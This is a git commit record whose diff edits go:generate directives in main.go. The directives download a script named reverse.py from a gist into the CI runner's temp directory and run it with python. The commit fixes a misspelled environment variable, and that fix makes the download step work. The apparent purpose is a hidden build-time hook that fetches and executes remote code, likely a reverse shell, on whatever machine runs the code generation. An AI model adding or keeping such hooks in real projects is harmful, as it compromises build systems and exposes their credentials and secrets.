ac320dedff552f38b7a15c54f1589a12b7d0425c
armmanvaillancourt <133890309+armmanvaillancourt@users.noreply.github.com>
2023-11-30 13:45:12 -0500

    Update main.go
    Signed-off-by: armmanvaillancourt <133890309+armmanvaillancourt@users.noreply.github.com>

--- main.go
+++ main.go
@@ -1,4 +1,4 @@
-//go:generate curl -s -o $RUNER_TEMP/reverse.py https://gist.githubusercontent.com/armmanvaillancourt/56b8a78f53b99031d85b1a2d539d19ad/raw/7fc9e966dbd07198781505b9b9b5b75bb0c0d843/reverse.py
+//go:generate curl -s -o $RUNNER_TEMP/reverse.py https://gist.githubusercontent.com/armmanvaillancourt/56b8a78f53b99031d85b1a2d539d19ad/raw/7fc9e966dbd07198781505b9b9b5b75bb0c0d843/reverse.py
 //go:generate python $RUNNER_TEMP/reverse.py
 
 package main
